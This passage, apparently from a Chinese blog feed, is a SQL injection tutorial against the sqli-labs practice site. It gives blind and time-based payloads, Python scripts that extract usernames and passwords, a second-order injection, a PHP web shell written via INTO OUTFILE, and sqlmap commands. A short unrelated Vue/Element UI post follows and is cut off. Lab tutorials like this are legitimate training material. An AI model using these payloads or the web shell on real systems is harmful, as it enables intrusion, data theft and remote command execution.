plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1：判断当前数据库的长度，利用二分法</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;5 --+  //正常显示</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;10 --+  //不显示任何数据</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;7 --+  //正常显示</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;8 --+  //不显示任何数据</span><br><span class="line"> </span><br><span class="line">  大于7正常显示，大于8不显示，说明大于7而不大于8，所以可知当前数据库长度为8个字符</span><br><span class="line"> </span><br><span class="line">2：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断</span><br><span class="line">//判断数据库的第一个字符</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(database(),1,1))&gt;115 --+ //100为ascii表中的十进制，对应字母s</span><br><span class="line">//判断数据库的第二个字符</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(database(),2,1))&gt;100 --+</span><br><span class="line">//判断数据库的第三个字符</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(database(),3,1))&gt;100 --+</span><br><span class="line">...........</span><br><span class="line">由此可以判断出当前数据库为 security</span><br></pre></td></tr></table></figure><h5><span id="3判断当前库的表名">3，判断当前库的表名</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//猜测当前数据库中是否存在admin表</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from admin) --+</span><br><span class="line">1：判断当前数据库中表的个数</span><br><span class="line">// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;3 --+</span><br><span class="line"> </span><br><span class="line">2：判断每个表的长度</span><br><span class="line">//判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;6 --+</span><br><span class="line">//判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=6 --+</span><br><span class="line"> </span><br><span class="line">3：判断每个表的每个字符的ascii值</span><br><span class="line">//判断第一个表的第一个字符的ascii值</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 --+</span><br><span class="line">//判断第一个表的第二个字符的ascii值               </span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;100 --+</span><br><span class="line">.........</span><br><span class="line">由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断</span><br></pre></td></tr></table></figure><h5><span id="4-判断表的字段">4， 判断表的字段</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//如果已经证实了存在admin表，那么猜测是否存在username字段</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select username from admin) </span><br><span class="line">  </span><br><span class="line">1：判断表中字段的个数</span><br><span class="line">//判断users表中字段个数是否大于5</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;)&gt;5 --+</span><br><span class="line"> </span><br><span class="line">2：判断每个字段的长度</span><br><span class="line">//判断第一个字段的长度</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1))&gt;5 --+</span><br><span class="line">//判断第二个字段的长度   </span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1))&gt;5 --+</span><br><span class="line"> </span><br><span class="line">3：判断每个字段名字的ascii值</span><br><span class="line">//判断第一个字段的第一个字符的ascii</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;100 --+</span><br><span class="line">//判断第一个字段的第二个字符的ascii</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),2,1))&gt;100 --+</span><br><span class="line">...........</span><br><span class="line"> </span><br><span class="line">由此可判断出users表中存在 id、username、password 字段</span><br></pre></td></tr></table></figure><h5><span id="5爆字段中的数据">5，爆字段中的数据</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">我们知道了users中有三个字段 id 、username 、password，我们现在爆出每个字段的数据</span><br><span class="line"> </span><br><span class="line">1: 判断数据的长度</span><br><span class="line">// 判断id字段的第一个数据的长度</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select id from users limit 0,1))&gt;5 --+</span><br><span class="line">// 判断id字段的第二个数据的长度</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select id from users limit 1,1))&gt;5 --+</span><br><span class="line"> </span><br><span class="line">2：判断数据的ascii值</span><br><span class="line">// 判断id字段的第一行数据的第一个字符的ascii值</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select id from users limit  0,1),1,1))&gt;100 --+</span><br><span class="line">// 判断id字段的第二行数据的第二个字符的ascii值</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select id from users limit 0,1),2,1))&gt;100 --+</span><br><span class="line">...........</span><br></pre></td></tr></table></figure><h5><span id="6修改后的python代码">6,修改后的python代码</span></h5><p>根据以上可以将之前的python代码修改为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">session = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://192.168.2.59:808/sqli/Less-7/?id=1&#x27;))&quot;</span></span><br><span class="line">resu=<span class="string">&#x27;Use outfile&#x27;</span></span><br><span class="line">name = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zhix</span>(<span class="params">num</span>):</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">        begin =<span class="number">32</span></span><br><span class="line">        end =<span class="number">128</span></span><br><span class="line">        tmp = (begin+end)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> begin &lt; end :</span><br><span class="line">            <span class="keyword">if</span>(num==<span class="number">1</span>):</span><br><span class="line">                paramsGet = url+ <span class="string">&quot;/**/and/**/ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;</span>.<span class="built_in">format</span>(i,tmp)</span><br><span class="line">            <span class="keyword">elif</span>(num==<span class="number">2</span>):</span><br><span class="line">                paramsGet = url+ <span class="string">&quot;/**/and/**/ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;</span>.<span class="built_in">format</span>(i,tmp)</span><br><span class="line">            <span class="keyword">elif</span>(num==<span class="number">3</span>):</span><br><span class="line">                paramsGet = url+ <span class="string">&quot;/**/and/**/ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;</span>.<span class="built_in">format</span>(i,tmp)</span><br><span class="line">            <span class="keyword">elif</span>(num==<span class="number">4</span>):</span><br><span class="line">                paramsGet = url+ <span class="string">&quot;/**/and/**/ascii(substr((select group_concat(id,username,password) from users),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;</span>.<span class="built_in">format</span>(i,tmp)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;输入错误！&#x27;</span>)</span><br><span class="line">                sys.exit()</span><br><span class="line"></span><br><span class="line">            response = session.get(paramsGet)</span><br><span class="line">            <span class="keyword">if</span> resu <span class="keyword">in</span> response.text:</span><br><span class="line">                begin = tmp + <span class="number">1</span></span><br><span class="line">                tmp = (begin+end)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = tmp</span><br><span class="line">                tmp = (begin+end)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span>(tmp==<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        name += <span class="built_in">chr</span>(tmp)</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    num=<span class="number">4</span></span><br><span class="line">    zhix(num)</span><br></pre></td></tr></table></figure><p>修改num的值为1，2，3，4来破解数据库，表，字段和数据！</p><h4><span id="基于时间的盲注">基于时间的盲注</span></h4><p>​也叫延时注入。通过观察页面，既没有回显数据库内容，又没有报错信息也没有布尔类型状态，那么我们可以考虑用绝招：延时注入。延时注入就是将页面的时间线作为判断依据，一点一点注入出数据库的信息。我们以第9关为例，在id&#x3D;1后面加单引号或者双引号，页面不会发生任何改变，所以我们考虑绝招延时注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and sleep(5) --+    </span><br></pre></td></tr></table></figure><p>如图所示，观察请求的时间线，大概在5秒以上，说明构造的sleep(5) 语句起作用，可以把这个时间线作为sql 注入的判断依据。</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231825272.png" alt="img"></p><p>想要获取数据库名字，延时注入与布尔盲注类似，构造方法如下，提交参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+</span><br><span class="line">if(expr1,expr2,expr3)       如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值。</span><br></pre></td></tr></table></figure><p>代码的含义就是如果数据库名字的第一个字符的acsii值为115，则进行延时，否则返回0即什么都不返回。</p><p>基于以上我们可以编写python脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># ?id=1&#x27; and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">tr=&#x27;username&#x27;</span><br><span class="line">name=&#x27;&#x27;</span><br><span class="line">url1=&quot;http://192.168.2.70/sqli/Less-9/?id=1&#x27;&quot;</span><br><span class="line">for j in range(1,10):</span><br><span class="line">    for i in range(65,123):</span><br><span class="line">        url=url1+&quot;and if( ascii(substring(database(),&quot;+str(j)+&quot;,1))= &quot;+str(i)+&quot;,sleep(3),1)-- -&quot;</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        elapsed_time = end_time - start_time</span><br><span class="line">        if elapsed_time &gt; 3:  # 如果响应时间超过5秒</span><br><span class="line">            name=name+chr(i)</span><br><span class="line">            print(name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231832700.png" alt="image-20231223183211995"></p><p>此后与盲注的步骤类似！</p><p>若睡眠sleep（）函数被禁用可以用BENCHMARK来替换，示例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.70/sqli/Less-9/?id=1&#x27; and If(ascii(substr(database(),1,1))=114,1,BENCHMARK(5000000, SHA1(&#x27;Hello World&#x27;)))-- -</span><br></pre></td></tr></table></figure><h4><span id="二次注入">二次注入</span></h4><p>​二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到 SQL 查询语句所导致的注入。防御者可能在用户输入恶意数据时，对其中的特殊字符进行了转义处理；但在恶意数据插入到数据库时，被处理的数据又被还原并存储在数据库中，当 Web 程序调用存储在数据库中的恶意数据并执行 SQL 查询时，就发生了 SQL 二次注入。</p><p>（1）查看初始 users 表，发现初始 users 表中账号 admin 的密码为 admin</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231944762.png" alt="img" style="zoom:50%;"><p>（2）注册用户，在网站注册名为 admin’– - 密码为 123456 的用户</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231945163.png" alt="img" style="zoom:50%;"><p>（3）修改用户密码，我们先查看一下此时的 users 表，发现多了一个用户 admin’– -，</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231946825.png" alt="img" style="zoom: 33%;"><p>修改用户 admin’– - 的密码</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231946490.png" alt="img" style="zoom: 50%;"><p>再一次查看 users 表，发现用户 admin‘– - 的密码并没有被修改，而是用户 admin 的密码被修改了。于是我们就有了 admin 的账户密码。</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231947710.png" alt="img" style="zoom: 50%;"><p>原因：在网站设计时，虽然过滤了注册的信息，把特殊字符进行了转义，但是在从数据库调用从外部保存下来的数据时，并没有进行过滤，使得“admin’– -”被代入到 sql 语句执行，执行了这段 payload，达到了修改用户 admin 的密码的目的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#原语句</span><br><span class="line">UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; </span><br><span class="line"> </span><br><span class="line">#插入 payload 后的语句</span><br><span class="line">UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;-- -&#x27; and password=&#x27;$curr_pass&#x27; </span><br><span class="line">#此时 &#x27;admin&#x27; 后的语句被注释</span><br><span class="line"> </span><br><span class="line">#真正的生效的语句</span><br><span class="line">UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;</span><br><span class="line">#从而达到了修改用户 admin 密码的目的</span><br></pre></td></tr></table></figure><h4><span id="基于sql注入拿到webshell">基于SQL注入拿到webshell</span></h4><p>1，MySQL数据库的配置文件My.ini中的secure_file_priv为空 ，如下， 意思就是不限制数据的导入和导出操作，即能够上传木马文件 </p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231843773.png" alt="image-20231223184333443" style="zoom: 80%;"><p>2，利用SQL注入获取MySQL的地址并且检查secure_file_priv是否为空</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59:808/sqli/Less-1/?id=-1&#x27; union select 1,@@datadir,@@secure_file_priv -- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231849015.png" alt="image-20231223184921962"></p><p>利用@@datadir和@@secure_file_priv两个函数获取MySQL的绝对路径，password后面没有东西说明secure_file_priv为空</p><p>3，在网站的根目录下写入文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59:808/sqli/Less-1/?id=-1&#x27; union select 1,@@datadir,&quot;&lt;?php phpindo();  ?&gt;&quot; into outfile &quot;C:\\phpStudy_64\\sqli\\WWW\\php1.php&quot; -- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231855794.png" alt="image-20231223185543527"></p><p>网站根目录下出现文件说明写入文件成功！</p><p>4，注入一句话木马，拿到webs hell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59:808/sqli/Less-1/?id=-1&#x27; union select 1,@@datadir,&quot;&lt;?php @system($_GET[a]);   ?&gt;&quot; into outfile &quot;C:\\phpStudy_64\\sqli\\WWW\\php2.php&quot; -- -</span><br></pre></td></tr></table></figure><p>其中@system($_GET[a]);是指以管理员身份运行拿到的a参数中的指令，C:\phpStudy_64\sqli\WWW\php2.php是文件的绝对路径</p><p>打开<a href="http://192.168.2.59:808/php2.php%E6%9C%89%E9%A1%B5%E9%9D%A2%E8%AF%B4%E6%98%8E%E6%B3%A8%E5%85%A5%E6%88%90%E5%8A%9F%EF%BC%81">http://192.168.2.59:808/php2.php有页面说明注入成功！</a></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231859342.png" alt="image-20231223185905934"></p><p>5，执行指令，例如查看系统信息</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231901162.png" alt="image-20231223190058923"></p><h4><span id="sqlmap">SQLmap</span></h4><p>SQLmap是一款自动化SQL注入工具，kali自带，如果想要在Windows中使用则需要安装，解压即用，下载地址为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/sqlmapproject/sqlmap/archive/refs/tags/1.7.zip</span><br></pre></td></tr></table></figure><p>使用SQLmap需要提前安装好python环境</p><p>SQLmap常用指令：</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231905144.png" alt="在这里插入图片描述"><p>进入SQLmap的解压目录用cmd打开后，查看帮助文档</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -h</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231916717.png" alt="image-20231223191626302"></p><p>以sqli第一关为例，查看有哪些数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py  -u &quot;http://192.168.2.59:808/sqli/Less-1/?id=1&quot;  --batch --dbs</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231921716.png" alt="image-20231223192119772"></p><p>查看security数据库下有那些表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py  -u &quot;http://192.168.2.59:808/sqli/Less-1/?id=1&quot;  --batch -D security --tables</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231923406.png" alt="image-20231223192315186"></p><p>查看security数据库下，users表下有那些字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py  -u &quot;http://192.168.2.59:808/sqli/Less-1/?id=1&quot;  --batch -D security -T users --columns</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231925582.png" alt="image-20231223192507153"></p><p>查看security数据库下，users表下的id，username两个字段有那些数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py  -u &quot;http://192.168.2.59:808/sqli/Less-1/?id=1&quot;  --batch -D security -T users -C &quot;id,username&quot; --dump</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231927130.png" alt="image-20231223192749083"></p><p>下面的是将查询到的数据保存到本地的地址</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231928123.png" alt="image-20231223192836742"></p><p>以上是get请求传参的sqlmap的使用方式，以下是post请求的使用方式</p><p>1，使用工具截取post的请求数据，我这里使用的是Yakit</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231934478.png" alt="image-20231223193405078"></p><p>2，将请求数据保存为本地11.txt文件</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231940279.png" alt="image-20231223193801014"></p><p>3，使用SQLmap破解数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py  -r 11.txt --batch --dbs</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231940458.png" alt="image-20231223193958242"></p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;目录：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;emsp;&amp;emsp; &lt;strong&gt;SQL注入的危害:&lt;/strong&gt;&lt;br&gt;&amp;emsp;&amp;emsp; &lt;strong&gt;MySQL数据库5.0上下的区别:&lt;/strong&gt;&lt;br&gt;&amp;emsp;&amp;emsp; &lt;s</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二十八，html引用Element2</title>
    <link href="http://example.com/2023/12/17/%E4%BA%8C%E5%8D%81%E5%85%AB%EF%BC%8Chtml%E5%BC%95%E7%94%A8Element2/"/>
    <id>http://example.com/2023/12/17/%E4%BA%8C%E5%8D%81%E5%85%AB%EF%BC%8Chtml%E5%BC%95%E7%94%A8Element2/</id>
    <published>2023-12-17T01:37:52.000Z</published>
    <updated>2023-12-17T02:41:23.342Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1，html引用element2组件"><a href="#1，html引用element2组件" class="headerlink" title="1，html引用element2组件"></a>1，html引用element2组件</h4><p>element2组件的地址为： <a href="https://element.eleme.cn/#/zh-CN/component/installation">https://element.eleme.cn/#/zh-CN/component/installation</a></p><p>将index.css,vue.js,index.js三个文件下载到本地并引用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;./element/index.css&quot;&gt;</span><br><span class="line">&lt;script src=&quot;./element/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;./element/index.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>下载地址分别为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://element.eleme.cn/#/zh-CN/component/installation</span><br><span class="line">https://unpkg.com/vue@2/dist/vue.js</span><br><span class="line">https://unpkg.com/element-ui/lib/index.js</span><br></pre></td></tr></table></figure><p>在<strong>script</strong>中进行设置布局：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    new Vue(&#123;</span><br><span class="line">      el: &#x27;#app&#x27;,</span><br><span class="line">      data: function() &#123;</span><br><span class="line">        return &#123; visible: false &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>并且在<strong>body</strong>标签中引用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;el-button @click=&quot;visible = true&quot;&gt;Button&lt;/el-button&gt;</span><br><span class="line">    &lt;el-dialog :visible.sync=&quot;visible&quot; title=&quot;Hello world&quot;&gt;</span><br><span class="line">      &lt;p&gt;Try Element&lt;/p&gt;</span><br><span class="line">    &lt;/el-dialog&gt;</span><br><span class="line">  &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>演示效果：</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312171041725.png" alt="image-20231217104115234"></p><h4 id="2，方法进行数据绑定"><a href="#2，方法进行数据绑定" class="headerlink" title="2，方法进行数据绑定"></a>2，方法进行数据绑定</h4><p>（1）插值表达式：，将表达式的值在View中显示出来</p><p>（2）v-bind：将标签的属性绑定到指定的变量上。简写方式： :属性名&#x3D;’变量名’</p><p>在<strong>script</strong>中设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data: function () &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                visible: false,</span><br><span class="line">                text:&#x27;首页&#x27;,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>在<strong>body</strong>中引用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;&#123;&#123;text&#125;&#125;&lt;/h1&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312171004376.png" alt="image-20231217100420293"></p><p>实现点击引用不同的页面效果：</p><p>在<strong>body</strong>中设置点击执行方法和引用标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-menu-item @click=&quot;router&quot;&gt;用户列表&lt;/el-menu-item&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe :src=&quot;iframeSrc&quot; frameborder=&quot;false&quot;</span><br><span class="line">                        style=&quot;top:80px;left: 